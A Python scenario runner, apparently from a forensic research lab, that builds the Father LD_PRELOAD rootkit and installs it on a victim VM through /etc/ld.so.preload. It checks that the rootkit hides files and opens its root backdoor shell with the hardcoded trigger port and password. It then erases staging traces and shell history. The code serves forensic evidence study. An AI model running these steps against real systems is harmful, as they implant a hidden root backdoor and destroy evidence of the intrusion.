"""Explicit runner for the Father LD_PRELOAD scenario."""

from __future__ import annotations

import socket
from collections.abc import Callable
from pathlib import Path

import yaml

from orchestrator.core import console
from orchestrator.core.provenance import file_sha256
from orchestrator.core.ssh_client import SSHClient, SSHTerminal
from scenarios.command_log import record_operation, run_logged_command

SCENARIO_ID = "userland_father_ldpreload"
ROOT = Path(__file__).resolve().parent
ARCHIVE = ROOT / "files/father-upstream-4eb2712.tar"
BUILD_SCRIPT = ROOT / "files/build.sh"
LOCK = ROOT / "father.lock.yml"
ARTIFACT_NAME = "rk.so"

# Paths on the builder VM, used only by the build path.
_BUILDER_ARCHIVE = "/tmp/father-upstream-4eb2712.tar"
_BUILDER_SCRIPT = "/tmp/father-build.sh"
_BUILDER_BUILD_ROOT = "/tmp/forensic-lab/father_build"

# Paths on the victim VM. This is the evidence surface a run leaves behind.
VICTIM_ROOT = "/tmp/forensic-lab/father_ldpreload"
VICTIM_ARTIFACT = f"/tmp/{ARTIFACT_NAME}"

# Father defaults
INSTALLED_LIBRARY = "/lib/selinux.so.3"
PRELOAD_CONFIG = "/etc/ld.so.preload"
SOURCE_PORT = 54321
SHELL_PASSWORD = b"lobster\0"
AUTHENTICATION_PROMPT = b"\n\nAUTHENTICATE: "
SHELL_MARKER = b"Enjoy the shell!"

# Only intentional Father customization
HIDDEN_PREFIX = "__malicious_"
HIDDEN_FILE_NAME = f"{HIDDEN_PREFIX}file"
HIDDEN_DIR = f"{VICTIM_ROOT}/probe"
LIST_HIDDEN_DIR = f"ls -la -- {HIDDEN_DIR}"

_CLEANUP_COMMANDS = (
    f"rm -f -- {VICTIM_ARTIFACT}",
    "history -c",
    'rm -f -- "${HISTFILE:-$HOME/.bash_history}"',
    "unset HISTFILE",
)


def run_father(
    ssh: SSHClient,
    transcript_path: Path,
    *,
    command_log_path: Path,
    artifact_path: Path,
    build_record: dict,
) -> tuple[dict, Callable[[], None]]:
    """Activate Father, clean its staging traces, and retain the live shell."""
    transcript_path.touch()
    console.scope("HOST", "stage Father artifact")
    _upload_artifact(ssh, command_log_path, artifact_path)

    terminal = ssh.open_terminal()
    backdoor_socket = None

    def close_backdoor_socket() -> None:
        nonlocal backdoor_socket
        if backdoor_socket is None:
            return
        backdoor_socket.close()
        backdoor_socket = None

    try:
        try:
            with terminal:
                _verify_guest_identity(terminal, command_log_path, build_record)
                _activate_father(terminal, command_log_path)
                _validate_file_hiding(terminal, command_log_path)

                console.scope("HOST", "validate Father backdoor")
                try:
                    backdoor_socket, connection = _validate_backdoor(ssh)
                except Exception as exc:
                    record_operation(
                        command_log_path, "validate_backdoor", error=str(exc)
                    )
                    raise
                record_operation(command_log_path, "validate_backdoor")

                # Persist the staging object before deleting it so the cleanup
                # treatment has deterministic disk evidence for recovery.
                console.scope("GUEST", "persist staging artifact")
                run_logged_command(
                    terminal, command_log_path, "sync", timeout=180
                )
                _cleanup_staging(terminal, command_log_path)
        finally:
            transcript_path.write_text(terminal.transcript, encoding="utf-8")
    except BaseException:
        close_backdoor_socket()
        raise

    return {"backdoor_connection": connection}, close_backdoor_socket


def build(
    ssh: SSHClient,
    staging: Path,
    source: dict,
) -> tuple[Path, str]:
    """Build the pinned Father object on its builder VM."""
    artifact = staging / ARTIFACT_NAME
    ssh.put(ARCHIVE, _BUILDER_ARCHIVE)
    ssh.put(BUILD_SCRIPT, _BUILDER_SCRIPT)
    console.step(f"building {ARTIFACT_NAME}...")
    stdout = ssh.run_checked(
        f"bash {_BUILDER_SCRIPT} {_BUILDER_ARCHIVE} "
        f"{_BUILDER_BUILD_ROOT} {HIDDEN_PREFIX}",
        timeout=1800,
    )
    ssh.get(
        f"{_BUILDER_BUILD_ROOT}/Father-{source['commit']}/{ARTIFACT_NAME}",
        artifact,
    )
    return artifact, stdout


def build_recipe() -> dict:
    """Return the exact scenario-owned build recipe recorded by the host."""
    return {
        "sha256": file_sha256(BUILD_SCRIPT),
        "hidden_prefix": HIDDEN_PREFIX,
    }


def verify_source() -> dict:
    """Check the vendored archive against the pinned lock. Host-side, no VM."""
    lock = yaml.safe_load(LOCK.read_text(encoding="utf-8"))
    archive_hash = file_sha256(ARCHIVE)
    expected_hash = lock["retrieval"]["archive_sha256"]
    if archive_hash != expected_hash:
        raise RuntimeError(
            "Father archive SHA-256 mismatch: "
            f"expected {expected_hash}, got {archive_hash}"
        )
    console.ok(f"Father source verified: {archive_hash}")
    return {
        "repository": lock["upstream"]["url"],
        "commit": lock["upstream"]["pinned_commit"],
        "archive_sha256": archive_hash,
    }


def _verify_guest_identity(
    terminal: SSHTerminal,
    command_log_path: Path,
    build_record: dict,
) -> None:
    console.scope("GUEST", "verify prepared artifact")
    guest_identity = run_logged_command(
        terminal,
        command_log_path,
        ". /etc/os-release; "
        "printf '%s-%s %s\\n' \"$ID\" \"$VERSION_ID\" \"$(uname -m)\"",
        timeout=180,
    ).combined_output
    try:
        expected = (
            f"{build_record['target']['distro_id']} "
            f"{build_record['target']['arch']}"
        )
        if guest_identity != expected:
            raise RuntimeError(
                f"Father artifact targets {expected}, guest is {guest_identity}"
            )
    except Exception as exc:
        record_operation(command_log_path, "verify_guest_identity", error=str(exc))
        raise
    record_operation(command_log_path, "verify_guest_identity")


def _activate_father(terminal: SSHTerminal, command_log_path: Path) -> None:
    console.scope("GUEST", "install and activate")
    for command in (
        f"mkdir -p {HIDDEN_DIR}",
        f"sudo -n install -m 0644 {VICTIM_ARTIFACT} {INSTALLED_LIBRARY}",
        f"touch {HIDDEN_DIR}/{HIDDEN_FILE_NAME}",
    ):
        run_logged_command(terminal, command_log_path, command, timeout=180)

    visible_listing = run_logged_command(
        terminal, command_log_path, LIST_HIDDEN_DIR, timeout=180
    ).combined_output
    if HIDDEN_FILE_NAME not in visible_listing:
        raise RuntimeError("Controlled file was not visible before activation")

    for command in (
        f"printf '%s\\n' {INSTALLED_LIBRARY} | sudo -n tee {PRELOAD_CONFIG}",
        "sudo -n systemctl restart ssh.service",
    ):
        run_logged_command(terminal, command_log_path, command, timeout=180)


def _validate_file_hiding(
    terminal: SSHTerminal,
    command_log_path: Path,
) -> None:
    console.scope("GUEST", "validate behavior")
    hidden_listing = run_logged_command(
        terminal, command_log_path, LIST_HIDDEN_DIR, timeout=180
    ).combined_output
    if HIDDEN_FILE_NAME in hidden_listing:
        raise RuntimeError("Controlled file remained visible after activation")


def _cleanup_staging(terminal: SSHTerminal, command_log_path: Path) -> None:
    console.scope("GUEST", "cleanup staging traces")
    for command in _CLEANUP_COMMANDS:
        run_logged_command(terminal, command_log_path, command, timeout=180)
    for command in (
        f"test ! -e {VICTIM_ARTIFACT}",
        'test ! -e "${HISTFILE:-$HOME/.bash_history}"',
        f"test -e {PRELOAD_CONFIG} && test -e {INSTALLED_LIBRARY}",
    ):
        run_logged_command(terminal, command_log_path, command, timeout=180)


def _upload_artifact(
    ssh: SSHClient,
    command_log_path: Path,
    artifact_path: Path,
) -> None:
    console.step(f"Uploading {artifact_path.name} to {VICTIM_ARTIFACT}...")
    try:
        ssh.put(artifact_path, VICTIM_ARTIFACT)
    except Exception as exc:
        record_operation(command_log_path, "upload_artifact", error=str(exc))
        raise
    record_operation(command_log_path, "upload_artifact")


def _validate_backdoor(
    ssh: SSHClient,
) -> tuple[socket.socket, dict]:
    console.step(
        f"Connecting to {ssh.host}:{ssh.port} from Father trigger port "
        f"{SOURCE_PORT}..."
    )
    client = None
    try:
        client = socket.create_connection(
            (ssh.host, ssh.port),
            timeout=12,
            source_address=("", SOURCE_PORT),
        )
        client_address, client_port = client.getsockname()[:2]
        server_address, server_port = client.getpeername()[:2]
        connection = {
            "client_address": client_address,
            "client_port": client_port,
            "server_address": server_address,
            "server_port": server_port,
        }
        with client.makefile("rb") as response:
            response.read(len(AUTHENTICATION_PROMPT))
            client.sendall(SHELL_PASSWORD)
            if not any(SHELL_MARKER in line for line in response):
                raise RuntimeError("Father did not open the native shell")

            client.sendall(b"id\n")
            identity = next(
                (
                    line.decode(errors="replace").strip().removeprefix("\x1b[0m")
                    for line in response
                    if b"uid=0(root)" in line and b"gid=1337" in line
                ),
                None,
            )
        if identity is None:
            raise RuntimeError("Father shell did not return the expected root identity")
        console.ok(f'Father shell opened: "{SHELL_MARKER.decode()}"')
        console.ok(f"Father shell identity: {identity}")
        return client, connection
    except OSError as exc:
        if client is not None:
            client.close()
        raise RuntimeError(f"Father backdoor connection failed: {exc}") from exc
    except BaseException:
        if client is not None:
            client.close()
        raise
